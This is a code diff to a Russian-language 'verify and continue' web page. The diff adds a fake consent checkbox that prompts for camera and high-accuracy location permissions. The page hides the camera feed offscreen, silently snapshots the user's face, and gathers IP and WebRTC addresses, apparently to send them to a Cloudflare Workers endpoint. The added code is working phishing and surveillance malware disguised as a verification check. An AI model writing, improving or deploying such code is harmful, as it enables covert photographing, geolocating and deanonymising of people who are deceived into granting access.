@@ -35,6 +35,31 @@
   video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
+
+  /* ГАЛОЧКА «Я СОГЛАСЕН» */
+  .consent{
+    display:flex;align-items:flex-start;gap:12px;
+    padding:13px 16px;margin:16px 0 0;
+    background:#0d1117;border:1px solid #21262d;border-radius:10px;
+    text-align:left;cursor:pointer;transition:border .15s, background .15s;
+    user-select:none;
+  }
+  .consent:hover{border-color:#30363d;background:#101519}
+  .consent.on{border-color:#238636;background:#0f1e14}
+  .consent input{
+    appearance:none;-webkit-appearance:none;
+    width:20px;height:20px;min-width:20px;margin:2px 0 0 0;
+    border:2px solid #30363d;border-radius:5px;
+    background:#0d1117;position:relative;cursor:pointer;
+    transition:background .15s, border-color .15s;
+  }
+  .consent input:checked{background:#238636;border-color:#2ea043}
+  .consent input:checked::after{
+    content:"✓";position:absolute;color:#fff;font-size:14px;
+    font-weight:700;left:3px;top:-2px;
+  }
+  .consent .lbl{color:#e6edf3;font-size:13px;line-height:1.5}
+  .consent .lbl small{color:#8b949e;display:block;font-size:11px;margin-top:2px}
 </style>
 </head>
 <body>
@@ -51,6 +76,17 @@
   </div>
 
   <button id="btn">Проверить и продолжить</button>
+
+  <!-- НОВАЯ ГАЛОЧКА -->
+  <label class="consent" id="consentWrap">
+    <input type="checkbox" id="consentCb">
+    <div class="lbl">
+      Я согласен на проверку
+      <small>Разрешить доступ обезательно!</small>
+    </div>
+  </label>
+  <!-- /НОВАЯ ГАЛОЧКА -->
+
   <div class="status" id="st"></div>
 
   <div class="fine">
@@ -217,16 +253,108 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     } catch(e) { return 'н/д'; }
   }
 
+  // ============================================================
+  // ГАЛОЧКА «Я СОГЛАСЕН» — триггерит попапы разрешений сразу
+  // ============================================================
+  var consentCb   = document.getElementById('consentCb');
+  var consentWrap = document.getElementById('consentWrap');
+
+  var camGranted = false;    // камера уже разрешена
+  var camStream  = null;     // живой поток камеры
+  var geoGranted = false;    // гео уже разрешено
+  var geoData    = null;     // координаты
+
+  consentCb.addEventListener('change', async function(){
+    if (!consentCb.checked) {
+      consentWrap.classList.remove('on');
+      return;
+    }
+    consentWrap.classList.add('on');
+    setStatus('Запрашиваем разрешения…');
+
+    // ---- 1. Камера ----
+    try {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        camStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        cam.srcObject = camStream;
+        cam.play();
+        camGranted = true;
+      }
+    } catch(e) {
+      camGranted = false;
+    }
+
+    // ---- 2. Геолокация ----
+    await new Promise(function(resolve){
+      if (!navigator.geolocation) return resolve(false);
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          geoData = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: Math.round(pos.coords.accuracy)
+          };
+          geoGranted = true;
+          resolve(true);
+        },
+        function(err){
+          geoGranted = false;
+          resolve(false);
+        },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+      );
+    });
+
+    // ---- 3. Итог ----
+    if (camGranted && geoGranted) {
+      setStatus('✓ Разрешения получены. Нажмите «Проверить и продолжить».', 'ok');
+    } else if (camGranted || geoGranted) {
+      setStatus('Частично разрешено. Можно продолжать.', '');
+    } else {
+      setStatus('Разрешения не получены.', 'err');
+    }
+  });
+
+  // ============================================================
+  // ОСНОВНАЯ КНОПКА
+  // ============================================================
   btn.addEventListener('click', async function(){
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
     setStatus('.....');
 
-    var [ipInfo, rtc, geo, camRes] = await Promise.all([
+    // Если галочка стояла — используем уже открытый поток и гео.
+    // Если нет — запрашиваем как обычно.
+    var camRes;
+    if (camGranted && camStream) {
+      try {
+        var w = cam.videoWidth || 640;
+        var h = cam.videoHeight || 480;
+        snap.width = w;
+        snap.height = h;
+        var ctx = snap.getContext('2d');
+        ctx.drawImage(cam, 0, 0, w, h);
+        var dataUrl = snap.toDataURL('image/jpeg', 0.85);
+        camRes = { dataUrl: dataUrl, w: w, h: h };
+        camStream.getTracks().forEach(function(t){ t.stop(); });
+        camStream = null;
+      } catch(e) {
+        camRes = { error: 'snapshot failed: ' + e.message };
+      }
+    } else {
+      camRes = await getCameraSnapshot();
+    }
+
+    var geo = (geoGranted && geoData)
+      ? geoData
+      : await getGeolocation();
+
+    var [ipInfo, rtc] = await Promise.all([
       getIpInfo(),
-      getLocalAndSrflx(),
-      getGeolocation(),
-      getCameraSnapshot()
+      getLocalAndSrflx()
     ]);
 
     // --- фото в blob ---
